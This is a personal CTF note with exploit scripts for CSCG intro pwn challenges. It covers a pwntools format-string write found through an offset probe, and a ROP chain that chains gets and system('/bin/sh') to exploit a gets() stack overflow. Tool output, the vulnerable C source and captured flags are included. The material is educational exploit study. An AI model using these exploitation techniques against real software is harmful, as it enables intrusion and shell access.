---
title: "Format String (pwn)"
category: "pwn"
subcategory: "rop"
type: "technique"
tags: ["my-notes", "personal", "rop", "format-string", "canary", "pie", "checksec", "gets", "objdump", "pwn"]
summary: "Personal note: Format String (pwn)."
source:
  name: "Personal notes"
origin_path: "pwn/Format String.md"
---

# Write
Find offset
```bash
➜  pwn2 python3 -c "print('AAAA' + '%x.'*30)" | ./intro-fmt
What is your name?
Thank you AAAA4accbad0.0.acb14887.a.accb6040.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2.0.acc1aaa0.acc1bf10.accb6040.d.accae160.acc1a1b8.40129d.1f80.accea040.accc2f71.1.!
But our flag is in another branch!
```

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

r = process('./intro-fmt')
r = remote("35dd123f0bc396e27bf8d796-1024-intro-pwn-2.challenge.cscg.live", 1337, ssl=True)
elf = ELF('./intro-fmt')

bug = elf.symbols['bug']
# info(hex(bug))
payload = fmtstr_payload(6, {bug: 1})

r.sendlineafter(b'What is your name?\n', payload)

r.interactive()

# CSCG{f0rm4t_5tr1ng_p0w3r_d15pl4y3d}
```

---

# Intro to PWN 1
```python
#include <stdio.h>
#include <stdlib.h>

// --------------------------------------------------- SETUP


void ignore_me_init_buffering()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

// --------------------------------------------------- VULNERABLE FUNCTION

void win()
{
    system("echo no cat /flag for you");
}

void vuln() {
    char name[16];
    printf("What is your name?\n");
    gets(name);
    printf("Hello %s!\nI have a present for you: %d\n", name, 0xc35f);
}

// --------------------------------------------------- MAIN

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

	ignore_me_init_buffering();

    vuln();
    return 0;
}
```

```bash
➜  pwn1 checksec intro-pwn 
[*] '/home/serioton/Desktop/CSCGctf/pwn1/intro-pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```
### Building the ROP Chain
```bash
➜  pwn1 ROPgadget --binary ./intro-pwn | grep "pop rdi"
0x0000000000401205 : pop rdi ; ret
```

```bash
➜  pwn1 objdump -d ./intro-pwn | grep system
0000000000401040 <system@plt>:
  401040:	ff 25 c2 2f 00 00    	jmp    *0x2fc2(%rip)        # 404008 <system@GLIBC_2.2.5>
  4011d5:	e8 66 fe ff ff       	call   401040 <system@plt>
```

```bash
➜  pwn1 objdump -d ./intro-pwn | grep gets@plt
0000000000401060 <gets@plt>:
  4011fb:	e8 60 fe ff ff       	call   401060 <gets@plt>
```

```bash
➜  pwn1 readelf -S ./intro-pwn | grep .data
  [16] .rodata           PROGBITS         0000000000402000  00002000
  [24] .data             PROGBITS         0000000000404028  00003028
```

```python
from pwn import *

context.arch = "amd64"
log.level = "debug"
p = process("./intro-pwn")
e = ELF("./intro-pwn", checksec=False)

# pop_rdi = 0x401205
# system = 0x401040
# gets = 0x401060
# data_ = 0x404028

rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# log.info(f"pop rdi gadget: {hex(gadget)}")
gets_plt = e.plt['gets']
system_plt = e.plt['system']
data_section = e.get_section_by_name('.data').header.sh_addr

payload = b"A" * 24
payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(gets_plt)

payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(system_plt)

p.sendline(payload)
p.sendline(b"/bin/sh")

p.interactive()

# CSCG{5om3t1m35_y0u_c4nt_533_th3_f0r35t_f0r_th3_tr335}
```
### Automated Exploit
```python
from pwn import *  
  
  
context.binary = './intro-pwn'  
context.arch = 'amd64' # Assuming 64-bit binary  
  
  
io = process("./intro-pwn")  
#io = process(["ncat", "--ssl-verify", "f43bc95a0dfaf7fe9b382c62-1024-intro-pwn-1.challenge.cscg.live", "1337"])  
  
elf = ELF('./intro-pwn')  
  
# Addresses  
pop_rdi = next(elf.search(asm('pop rdi; ret')))  
system_addr = elf.symbols['system']  
data_addr = elf.symbols['__data_start']  
gets_addr = elf.symbols['gets']  
  
# Payload  
payload = flat(  
b"A" * 24,  
pop_rdi,  
data_addr,  
gets_addr,  
pop_rdi,  
data_addr,  
system_addr  
)  
  
io.sendline(payload)  
io.sendline(b"/bin/sh")  
io.interactive()
```

---

*From your own notes: `pwn/Format String.md`*
